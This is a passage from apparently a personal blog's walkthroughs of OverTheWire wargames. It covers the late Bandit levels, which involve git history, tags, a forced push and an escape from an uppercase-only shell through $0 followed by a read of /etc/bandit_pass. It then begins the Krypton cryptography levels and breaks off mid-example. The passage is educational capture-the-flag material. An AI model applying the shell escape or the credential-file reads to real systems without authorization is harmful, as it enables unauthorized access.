<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit29@bandit:/tmp/gitfolder3/repo$ git log
commit 84abedc104bbc0c65cb9eb74eb1d3057753e70f8
Author: Ben Dover &lt;noone@overthewire.org&gt;
Date:   Tue Oct <span style="color:#ae81ff">16</span> 14:00:41 <span style="color:#ae81ff">2018</span> +0200

    fix username

commit 9b19e7d8c1aadf4edcc5b15ba8107329ad6c5650
Author: Ben Dover &lt;noone@overthewire.org&gt;
Date:   Tue Oct <span style="color:#ae81ff">16</span> 14:00:41 <span style="color:#ae81ff">2018</span> +0200

    initial commit of README.md
</code></pre></div><p>We can check if that first commit has anything interesting.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit29@bandit:/tmp/gitfolder3/repo$ git checkout 9b19e7d8c1aadf4edcc5b15ba8107329ad6c5650
Note: checking out <span style="color:#e6db74">&#39;9b19e7d8c1aadf4edcc5b15ba8107329ad6c5650&#39;</span>.

You are in <span style="color:#e6db74">&#39;detached HEAD&#39;</span> state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by performing another checkout.

If you want to create a new branch to retain commits you create, you may
<span style="color:#66d9ef">do</span> so <span style="color:#f92672">(</span>now or later<span style="color:#f92672">)</span> by using -b with the checkout command again. Example:

  git checkout -b &lt;new-branch-name&gt;

HEAD is now at 9b19e7d... initial commit of README.md
</code></pre></div><p>Now let&rsquo;s check the file&rsquo;s content again.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit29@bandit:/tmp/gitfolder3/repo$ cat README.md 
<span style="color:#75715e"># Bandit Notes</span>
Some notes <span style="color:#66d9ef">for</span> bandit30 of bandit.

<span style="color:#75715e">## credentials</span>

- username: bandit29
- password: &lt;no passwords in production!&gt;
</code></pre></div><p>Hm&hellip; Still nothing. Let&rsquo;s go back to our most recent commit by doing <code>git pull</code> and the repo link.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit29@bandit:/tmp/gitfolder3/repo$ git pull ssh://bandit29-git@localhost/home/bandit29-git/repo
Could not create directory <span style="color:#e6db74">&#39;/home/bandit29/.ssh&#39;</span>.
The authenticity of host <span style="color:#e6db74">&#39;localhost (127.0.0.1)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
</span><span style="color:#e6db74">ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
</span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no)? yes
</span><span style="color:#e6db74">Failed to add the host to the list of known hosts (/home/bandit29/.ssh/known_hosts).
</span><span style="color:#e6db74">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">bandit29-git@localhost&#39;</span>s password: 
From ssh://localhost/home/bandit29-git/repo
 * branch            HEAD       -&gt; FETCH_HEAD
Updating 9b19e7d..84abedc
Fast-forward
 README.md | <span style="color:#ae81ff">2</span> +-
 <span style="color:#ae81ff">1</span> file changed, <span style="color:#ae81ff">1</span> insertion<span style="color:#f92672">(</span>+<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> deletion<span style="color:#f92672">(</span>-<span style="color:#f92672">)</span>
</code></pre></div><p>We can see what branches exist by doing <code>git branch</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit29@bandit:/tmp/gitfolder3/repo$ git branch
* <span style="color:#f92672">(</span>HEAD detached from 9b19e7d<span style="color:#f92672">)</span>
  master
</code></pre></div><p>We have 2 branches. Let&rsquo;s switch to the <code>master</code> branch since our checkouts may have messed with some changes.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit29@bandit:/tmp/gitfolder3/repo$ git checkout master
Switched to branch <span style="color:#e6db74">&#39;master&#39;</span>
Your branch is up-to-date with <span style="color:#e6db74">&#39;origin/master&#39;</span>.
bandit29@bandit:/tmp/gitfolder3/repo$ git branch
* master
</code></pre></div><p>Hm&hellip; I guess we can see if there are any other branches that don&rsquo;t show up here.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit29@bandit:/tmp/gitfolder3/repo$ git show-branch --all
! <span style="color:#f92672">[</span>dev<span style="color:#f92672">]</span> add data needed <span style="color:#66d9ef">for</span> development
 * <span style="color:#f92672">[</span>master<span style="color:#f92672">]</span> fix username
  ! <span style="color:#f92672">[</span>origin/HEAD<span style="color:#f92672">]</span> fix username
   ! <span style="color:#f92672">[</span>origin/dev<span style="color:#f92672">]</span> add data needed <span style="color:#66d9ef">for</span> development
    ! <span style="color:#f92672">[</span>origin/master<span style="color:#f92672">]</span> fix username
     ! <span style="color:#f92672">[</span>origin/sploits-dev<span style="color:#f92672">]</span> add some silly exploit, just <span style="color:#66d9ef">for</span> shit and giggles
------
     + <span style="color:#f92672">[</span>origin/sploits-dev<span style="color:#f92672">]</span> add some silly exploit, just <span style="color:#66d9ef">for</span> shit and giggles
+  +   <span style="color:#f92672">[</span>dev<span style="color:#f92672">]</span> add data needed <span style="color:#66d9ef">for</span> development
+  +   <span style="color:#f92672">[</span>dev^<span style="color:#f92672">]</span> add gif2ascii
+*++++ <span style="color:#f92672">[</span>master<span style="color:#f92672">]</span> fix username
</code></pre></div><p>Ok we have some other branches like <code>dev</code> and <code>sploits-dev</code>. Since i like exploits let&rsquo;s check that one first.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit29@bandit:/tmp/gitfolder3/repo$ git checkout sploits-dev 
Branch sploits-dev set up to track remote branch sploits-dev from origin.
Switched to a new branch <span style="color:#e6db74">&#39;sploits-dev&#39;</span>
bandit29@bandit:/tmp/gitfolder3/repo$ ls -la
total <span style="color:#ae81ff">20</span>
drwxr-sr-x <span style="color:#ae81ff">4</span> bandit29 root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span> 14:27 .
drwxr-sr-x <span style="color:#ae81ff">3</span> bandit29 root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span> 14:02 ..
drwxr-sr-x <span style="color:#ae81ff">2</span> bandit29 root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span> 14:27 exploits
drwxr-sr-x <span style="color:#ae81ff">8</span> bandit29 root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span> 14:27 .git
-rw-r--r-- <span style="color:#ae81ff">1</span> bandit29 root  <span style="color:#ae81ff">131</span> Jul  <span style="color:#ae81ff">6</span> 14:25 README.md
</code></pre></div><p>That folder seems interesting.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit29@bandit:/tmp/gitfolder3/repo$ cd exploits/
bandit29@bandit:/tmp/gitfolder3/repo/exploits$ ls -la
total <span style="color:#ae81ff">12</span>
drwxr-sr-x <span style="color:#ae81ff">2</span> bandit29 root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span> 14:27 .
drwxr-sr-x <span style="color:#ae81ff">4</span> bandit29 root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span> 14:27 ..
-rw-r--r-- <span style="color:#ae81ff">1</span> bandit29 root    <span style="color:#ae81ff">1</span> Jul  <span style="color:#ae81ff">6</span> 14:27 horde5.md
</code></pre></div><p>We HAVE to print that file&rsquo;s content.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit29@bandit:/tmp/gitfolder3/repo/exploits$ cat horde5.md 

</code></pre></div><p>Oh&hellip; It&rsquo;s empty. Let&rsquo;s check the other branch then.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit29@bandit:/tmp/gitfolder3/repo$ git checkout dev
Switched to branch <span style="color:#e6db74">&#39;dev&#39;</span>
Your branch is up-to-date with <span style="color:#e6db74">&#39;origin/dev&#39;</span>.
bandit29@bandit:/tmp/gitfolder3/repo$ ls -la
total <span style="color:#ae81ff">20</span>
drwxr-sr-x <span style="color:#ae81ff">4</span> bandit29 root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span> 14:31 .
drwxr-sr-x <span style="color:#ae81ff">3</span> bandit29 root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span> 14:02 ..
drwxr-sr-x <span style="color:#ae81ff">2</span> bandit29 root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span> 14:31 code
drwxr-sr-x <span style="color:#ae81ff">8</span> bandit29 root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span> 14:31 .git
-rw-r--r-- <span style="color:#ae81ff">1</span> bandit29 root  <span style="color:#ae81ff">134</span> Jul  <span style="color:#ae81ff">6</span> 14:31 README.md
</code></pre></div><p>Let&rsquo;s first check <code>README.md</code> to be sure it has nothing new.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit29@bandit:/tmp/gitfolder3/repo$ cat README.md 
<span style="color:#75715e"># Bandit Notes</span>
Some notes <span style="color:#66d9ef">for</span> bandit30 of bandit.

<span style="color:#75715e">## credentials</span>

- username: bandit30
- password: 5b90576bedb2cc04c86a9e924ce42faf
</code></pre></div><p>This should do it. Good job.</p>
<h2 id="level-31">Level 31</h2>
<p>This challenge is still related to <strong>git</strong>. So we&rsquo;ll just follow the same steps as before, create the directory and clone the repo in there.</p>
<pre><code>bandit30@bandit:~$ mkdir /tmp/gitfolder4
bandit30@bandit:~$ cd /tmp/gitfolder4
bandit30@bandit:/tmp/gitfolder4$ git clone ssh://bandit30-git@localhost/home/bandit30-git/repo
Cloning into 'repo'...
Could not create directory '/home/bandit30/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit30/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit30-git@localhost's password: 
remote: Counting objects: 4, done.
remote: Total 4 (delta 0), reused 0 (delta 0)
Receiving objects: 100% (4/4), done.
</code></pre><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit30@bandit:/tmp/gitfolder4$ ls -la
total <span style="color:#ae81ff">1952</span>
drwxr-sr-x     <span style="color:#ae81ff">3</span> bandit30 root    <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span> 19:12 .
drwxrws-wt <span style="color:#ae81ff">57253</span> root     root <span style="color:#ae81ff">1986560</span> Jul  <span style="color:#ae81ff">6</span> 19:14 ..
drwxr-sr-x     <span style="color:#ae81ff">3</span> bandit30 root    <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span> 19:12 repo
bandit30@bandit:/tmp/gitfolder4$ cd repo
bandit30@bandit:/tmp/gitfolder4/repo$ ls -la
total <span style="color:#ae81ff">16</span>
drwxr-sr-x <span style="color:#ae81ff">3</span> bandit30 root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span> 19:12 .
drwxr-sr-x <span style="color:#ae81ff">3</span> bandit30 root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span> 19:12 ..
drwxr-sr-x <span style="color:#ae81ff">8</span> bandit30 root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span> 19:12 .git
-rw-r--r-- <span style="color:#ae81ff">1</span> bandit30 root   <span style="color:#ae81ff">30</span> Jul  <span style="color:#ae81ff">6</span> 19:12 README.md
bandit30@bandit:/tmp/gitfolder4/repo$ cat README.md 
just an epmty file... muahaha
</code></pre></div><p>This was me inspecting the files and folders in the repo. There is nothing interesting, so let&rsquo;s check <strong>git</strong>.</p>
<pre><code>bandit30@bandit:/tmp/gitfolder4/repo$ git show-branch --all
* [master] initial commit of README.md
 ! [origin/HEAD] initial commit of README.md
  ! [origin/master] initial commit of README.md
---
*++ [master] initial commit of README.md
</code></pre><p>No special hidden branches.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit30@bandit:/tmp/gitfolder4/repo$ git log
commit 3aa4c239f729b07deb99a52f125893e162daac9e
Author: Ben Dover &lt;noone@overthewire.org&gt;
Date:   Tue Oct <span style="color:#ae81ff">16</span> 14:00:44 <span style="color:#ae81ff">2018</span> +0200

    initial commit of README.md
</code></pre></div><p>Only one commit, nothing interesting&hellip; Let&rsquo;s check the tags then.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit30@bandit:/tmp/gitfolder4/repo/.git$ git tag
secret
</code></pre></div><p>OK this seems interesting! A tag called <code>secret</code>. We can see the tag message by doing <code>git show secret</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bandit30@bandit:/tmp/gitfolder4/repo$ git show secret
47e603bb428404d265f59c42920d81e5
</code></pre></div><p>We got the password. Next one!</p>
<h2 id="level-32">Level 32</h2>
<p>Once gain this challenge uses git.</p>
<pre><code>bandit31@bandit:~$ ls -la
total 24
drwxr-xr-x  2 root root 4096 Oct 16  2018 .
drwxr-xr-x 41 root root 4096 Oct 16  2018 ..
-rw-r--r--  1 root root  220 May 15  2017 .bash_logout
-rw-r--r--  1 root root 3526 May 15  2017 .bashrc
-rwxr-xr-x  1 root root   59 Oct 16  2018 .gitconfig
-rw-r--r--  1 root root  675 May 15  2017 .profile
bandit31@bandit:~$ mkdir /tmp/gitfolder5
bandit31@bandit:~$ cd /tmp/gitfolder5
bandit31@bandit:/tmp/gitfolder5$ git clone ssh://bandit31-git@localhost/home/bandit31-git/repo
Cloning into 'repo'...
Could not create directory '/home/bandit31/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit31-git@localhost's password: 
remote: Counting objects: 4, done.
remote: Compressing objects: 100% (3/3), done.
remote: Total 4 (delta 0), reused 0 (delta 0)
Receiving objects: 100% (4/4), done.
</code></pre><p>Let&rsquo;s inspect the repo.</p>
<pre><code>bandit31@bandit:/tmp/gitfolder5$ ls -la
total 1952
drwxr-sr-x     3 bandit31 root    4096 Jul  6 19:37 .
drwxrws-wt 57264 root     root 1986560 Jul  6 19:38 ..
drwxr-sr-x     3 bandit31 root    4096 Jul  6 19:37 repo
bandit31@bandit:/tmp/gitfolder5$ cd repo/
bandit31@bandit:/tmp/gitfolder5/repo$ ls -la
total 20
drwxr-sr-x 3 bandit31 root 4096 Jul  6 19:37 .
drwxr-sr-x 3 bandit31 root 4096 Jul  6 19:37 ..
drwxr-sr-x 8 bandit31 root 4096 Jul  6 19:37 .git
-rw-r--r-- 1 bandit31 root    6 Jul  6 19:37 .gitignore
-rw-r--r-- 1 bandit31 root  147 Jul  6 19:37 README.md
bandit31@bandit:/tmp/gitfolder5/repo$ cat README.md 
This time your task is to push a file to the remote repository.

Details:
    File name: key.txt
    Content: 'May I come in?'
    Branch: master
</code></pre><p>So the <code>README.md</code> mentions a <code>key.txt</code> file, and that we should push a file to the repo. Let&rsquo;s do it then.</p>
<pre><code>bandit31@bandit:/tmp/gitfolder5/repo$ vi key.txt 
bandit31@bandit:/tmp/gitfolder5/repo$ git add .
bandit31@bandit:/tmp/gitfolder5/repo$ git commit -a
On branch master
Your branch is up-to-date with 'origin/master'.
nothing to commit, working tree clean
</code></pre><p>Well we couldn&rsquo;t push since it says we are up to date. Maybe it&rsquo;s the gitignore. Let&rsquo;s see it.</p>
<pre><code>bandit31@bandit:/tmp/gitfolder5/repo$ cat .gitignore 
*.txt
</code></pre><p>So as i suspected <strong>git</strong> is ignoring all the files with the <code>txt</code> extension, so <code>key.txt</code> would be ignored. We can for the file to be added anyways by using the <code>-f</code> flag.</p>
<pre><code>bandit31@bandit:/tmp/gitfolder5/repo$ git add key.txt -f
bandit31@bandit:/tmp/gitfolder5/repo$ git commit -a
Unable to create directory /home/bandit31/.nano: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue

[master e67c6e5] Added key.txt file
 1 file changed, 1 insertion(+)
 create mode 100644 key.txt
</code></pre><p>Now we only need to push the file.</p>
<pre><code>bandit31@bandit:/tmp/gitfolder5/repo$ git push
Could not create directory '/home/bandit31/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit31-git@localhost's password: 
Counting objects: 3, done.
Delta compression using up to 4 threads.
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 326 bytes | 0 bytes/s, done.
Total 3 (delta 0), reused 0 (delta 0)
remote: ### Attempting to validate files... ####
remote: 
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote: 
remote: Well done! Here is the password for the next level:
remote: 56a9bf19c63d650ce78e6ec0354ee45e
remote: 
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote: 
To ssh://localhost/home/bandit31-git/repo
 ! [remote rejected] master -&gt; master (pre-receive hook declined)
error: failed to push some refs to 'ssh://bandit31-git@localhost/home/bandit31-git/repo'
</code></pre><p>We got the password! Good job.</p>
<h2 id="level-33">Level 33</h2>
<blockquote>
<p>After all this git stuff its time for another escape. Good luck!</p>
</blockquote>
<p>Enough of <strong>git</strong> then. Now we have to escape.</p>
<pre><code>WELCOME TO THE UPPERCASE SHELL
&gt;&gt;
</code></pre><p>So now we are stuck inside of a uppercase shell. Any command that we run is ran in upper case.</p>
<pre><code>&gt;&gt; ls
sh: 1: LS: not found
&gt;&gt; &quot;ls&quot;
sh: 1: LS: not found
</code></pre><p>Not even as a string.</p>
<p>Well i had to google this one because this wasn&rsquo;t really that easy. So it happens that the <code>$0</code> variable runs a shell, so that should be enough.</p>
<pre><code>&gt;&gt; $0
$ 
</code></pre><p>We got a shell. Now it should be easy to just see the file content.</p>
<pre><code>$ ls -la
total 28
drwxr-xr-x  2 root     root     4096 Oct 16  2018 .
drwxr-xr-x 41 root     root     4096 Oct 16  2018 ..
-rw-r--r--  1 root     root      220 May 15  2017 .bash_logout
-rw-r--r--  1 root     root     3526 May 15  2017 .bashrc
-rw-r--r--  1 root     root      675 May 15  2017 .profile
-rwsr-x---  1 bandit33 bandit32 7556 Oct 16  2018 uppershell
$ cat /etc/bandit_pass/bandit33
c9c3199ddf4121b10cf581a98d51caee
</code></pre><p>Done! Next one!</p>
<h2 id="level-34">Level 34</h2>
<pre><code>bandit33@bandit:~$ ls -la
total 24
drwxr-xr-x  2 root     root     4096 Oct 16  2018 .
drwxr-xr-x 41 root     root     4096 Oct 16  2018 ..
-rw-r--r--  1 root     root      220 May 15  2017 .bash_logout
-rw-r--r--  1 root     root     3526 May 15  2017 .bashrc
-rw-r--r--  1 root     root      675 May 15  2017 .profile
-rw-------  1 bandit33 bandit33  430 Oct 16  2018 README.txt
bandit33@bandit:~$ cat README.txt 
Congratulations on solving the last level of this game!

At this moment, there are no more levels to play in this game. However, we are constantly working
on new levels and will most likely expand this game with more levels soon.
Keep an eye out for an announcement on our usual communication channels!
In the meantime, you could play some of our other wargames.

If you have an idea for an awesome new level, please let us know!
</code></pre><p>We did it! We finished all the levels! At the moment (July 6th, 2019) there are no more challenges. So bye bye and thanks for checking out this walkthrough.</p>
]]></content></item><item><title>Over The Wire - Krypton Walkthrough</title><link>/posts/otw-krypton_walkthrough/</link><pubDate>Thu, 26 Dec 2019 22:41:28 +0000</pubDate><guid>/posts/otw-krypton_walkthrough/</guid><description>Introduction Over The Wire provides multiple challenges focused on different topics of computer systems. The one which we will solve here is Krypton. This is challenge is focused on cryptography.
You can read more about the challenge and how it works here.
Levels:
Level 0 Level 1 Level 2 Level 3 Level 4 Level 5 Level 6 Level 0 The password is a base64 encoded string. We can use the base64 command.</description><content type="html"><![CDATA[<h1 id="introduction">Introduction</h1>
<p><a href="http://overthewire.org/wargames/">Over The Wire</a> provides multiple challenges focused on different topics of computer systems.
The one which we will solve here is Krypton. This is challenge is focused on cryptography.</p>
<p>You can read more about the challenge and how it works <a href="http://overthewire.org/wargames/krypton/">here</a>.</p>
<p>Levels:</p>
<ul>
<li><a href="#level0">Level 0</a></li>
<li><a href="#level1">Level 1</a></li>
<li><a href="#level2">Level 2</a></li>
<li><a href="#level3">Level 3</a></li>
<li><a href="#level4">Level 4</a></li>
<li><a href="#level5">Level 5</a></li>
<li><a href="#level6">Level 6</a></li>
</ul>
<h2 id="level-0httpoverthewireorgwargameskryptonkrypton0html"><a href="http://overthewire.org/wargames/krypton/krypton0.html">Level 0</a></h2>
<p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<p>The password is a base64 encoded string. We can use the <strong>base64</strong> command. Let&rsquo;s check the manual.</p>
<pre><code>NAME
       base64 - base64 encode/decode data and print to standard output

SYNOPSIS
       base64 [OPTION]... [FILE]

DESCRIPTION
       Base64 encode or decode FILE, or standard input, to standard output.

       With no FILE, or when FILE is -, read standard input.

       Mandatory arguments to long options are mandatory for short options too.

       -d, --decode
              decode data
</code></pre><p>This is exactly what we want. We wneed to use the <code>-d</code> flag to decode, and we will pipeline the string with the <strong>echo</strong> command.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt; echo <span style="color:#e6db74">&#34;S1JZUFRPTklTR1JFQVQ=&#34;</span> | base64 -d                                                         KRYPTONISGREAT%
&gt;
</code></pre></div><p>The <code>%</code> does not make part of the string from what i understand. This password allows us to connect to <code>krypton.labs.overthewire.org</code> as <code>krypton1</code> on port <code>2222</code>. From now on the files that we need for the challenges will be in the <code>/krypton/</code> directory.</p>
<h2 id="level-1httpoverthewireorgwargameskryptonkrypton1html"><a href="http://overthewire.org/wargames/krypton/krypton1.html">Level 1</a></h2>
<p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<p>As we&rsquo;ve mentioned before all the challenges from now on will be in the <code>/krypton/</code> directory so if we go there and list the files we get this.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">krypton1@krypton:/krypton$ ls -la
total <span style="color:#ae81ff">32</span>
drwxr-xr-x  <span style="color:#ae81ff">8</span> root root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">1</span> 04:21 .
drwxr-xr-x <span style="color:#ae81ff">92</span> root root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">7</span> 14:54 ..
drwxr-xr-x  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">1</span> 04:20 krypton1
drwxr-xr-x  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">1</span> 04:20 krypton2
drwxr-xr-x  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">1</span> 04:20 krypton3
drwxr-xr-x  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">1</span> 04:20 krypton4
drwxr-xr-x  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">1</span> 04:20 krypton5
drwxr-xr-x  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">1</span> 04:21 krypton6
</code></pre></div><p>We are currently in <a href="#level1">Level 1</a> so let&rsquo;s change to the correct folder and list its content.</p>
<pre><code>krypton1@krypton:/krypton$ cd krypton1
krypton1@krypton:/krypton/krypton1$ ls -la
total 16
drwxr-xr-x 2 root     root     4096 Jul  1 04:20 .
drwxr-xr-x 8 root     root     4096 Jul  1 04:21 ..
-rw-r----- 1 krypton1 krypton1  882 Jul  1 04:20 README
-rw-r----- 1 krypton1 krypton1   26 Jul  1 04:20 krypton2
</code></pre><p>We should check out the README to get more insight on this challenge.</p>
<blockquote>
<p>Welcome to Krypton!</p>
</blockquote>
<blockquote>
<p>This game is intended to give hands on experience with cryptography and cryptanalysis.  The levels progress from classic ciphers, to modern, easy to harder. Although there are excellent public tools, like cryptool,to perform the simple analysis, we strongly encourage you to try and do these without them for now.  We will use them in later excercises.</p>
</blockquote>
<blockquote>
<p>** Please try these levels without cryptool first **</p>
</blockquote>
<blockquote>
<p>The first level is easy.  The password for level 2 is in the file &lsquo;krypton2&rsquo;.  It is &lsquo;encrypted&rsquo; using a simple rotation called ROT13. It is also in non-standard ciphertext format.  When using alpha characters for cipher text it is normal to group the letters into 5 letter clusters, regardless of word boundaries.  This helps obfuscate any patterns.</p>
</blockquote>
<blockquote>
<p>This file has kept the plain text word boundaries and carried them to the cipher text.</p>
</blockquote>
<blockquote>
<p>Enjoy!</p>
</blockquote>
<p>ROT13 should be easy. We&rsquo;ve messed with this previously in <a href="https://bruno-anjos.github.io/posts/bandit/">Bandit</a> using the <strong>tr</strong> command. There is a simple example in the wiki page of ROT13 with an implementation of ROT13 using the <strong>tr</strong> command.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">krypton1@krypton:/krypton/krypton1$ cat krypton2 | tr <span style="color:#e6db74">&#39;N-ZA-Mn-za-m&#39;</span> <span style="color:#e6db74">&#39;A-Za-z&#39;</span>
LEVEL TWO PASSWORD ROTTEN
</code></pre></div><p>We switched the letter patterns since the example is to encode and we want to <strong>decode</strong>. We have the password for the next level, let&rsquo;s go.</p>
<h2 id="level-2httpoverthewireorgwargameskryptonkrypton2html"><a href="http://overthewire.org/wargames/krypton/krypton2.html">Level 2</a></h2>
<p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<p>From now on i&rsquo;ll just change the to the challenge directory and <strong>cat</strong> the README.md without pasting it here explicitly.</p>
<blockquote>
<p>Krypton 2</p>
</blockquote>
<blockquote>
<p>ROT13 is a simple substitution cipher.</p>
</blockquote>
<blockquote>
<p>Substitution ciphers are a simple replacement algorithm.  In this example of a substitution cipher, we will explore a &lsquo;monoalphebetic&rsquo; cipher. Monoalphebetic means, literally, &ldquo;one alphabet&rdquo; and you will see why.</p>
</blockquote>
<blockquote>
<p>This level contains an old form of cipher called a &lsquo;Caesar Cipher&rsquo;.A Caesar cipher shifts the alphabet by a set number.  For example:
plain:  a b c d e f g h i j k &hellip;
cipher: G H I J K L M N O P Q &hellip;</p>
</blockquote>
<blockquote>
<p>In this example, the letter &lsquo;a&rsquo; in plaintext is replaced by a &lsquo;G&rsquo; in the ciphertext so, for example, the plaintext &lsquo;bad&rsquo; becomes &lsquo;HGJ&rsquo; in ciphertext.</p>
</blockquote>
<blockquote>
<p>The password for level 3 is in the file krypton3.  It is in 5 letter group ciphertext.  It is encrypted with a Caesar Cipher.  Without any further information, this cipher text may be difficult to break.  You do not have direct access to the key, however you do have access to a program that will encrypt anything you wish to give it using the key. If you think logically, this is completely easy.</p>
</blockquote>
<blockquote>
<p>One shot can solve it!</p>
</blockquote>
<blockquote>
<p>Have fun.</p>
</blockquote>
<blockquote>
<p>Additional Information:</p>
</blockquote>
<blockquote>
<p>The <code>encrypt</code> binary will look for the keyfile in your current working directory. Therefore, it might be best to create a working direcory in /tmp and in there a link to the keyfile. As the <code>encrypt</code> binary runs setuid <code>krypton3</code>, you also need to give <code>krypton3</code> access to your working directory.</p>
</blockquote>
<blockquote>
<p>Here is an example:</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">krypton2@melinda:~$ mktemp -d
/tmp/tmp.Wf2OnCpCDQ
krypton2@melinda:~$ cd /tmp/tmp.Wf2OnCpCDQ
